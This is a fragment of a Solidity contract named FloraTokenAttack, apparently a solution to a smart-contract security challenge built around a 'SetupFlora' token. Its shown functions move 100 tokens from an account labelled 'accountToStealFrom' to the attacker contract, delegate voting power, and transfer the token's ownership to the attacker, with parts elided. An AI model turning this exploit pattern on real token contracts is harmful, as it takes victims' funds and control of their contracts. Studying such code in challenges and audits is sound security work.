...
contract FloraTokenAttack {
    ...
    function stealFunds() external {
        IFloraToken(SetupFlora).transferFrom(accountToStealFrom, address(this), 100);
    }

    function delegate(address delegatee) external {
        IFloraToken(SetupFlora).delegate(delegatee);
    }

    function transferOwner() external {
        IFloraToken(SetupFlora).transferOwnership(address(this));
    }
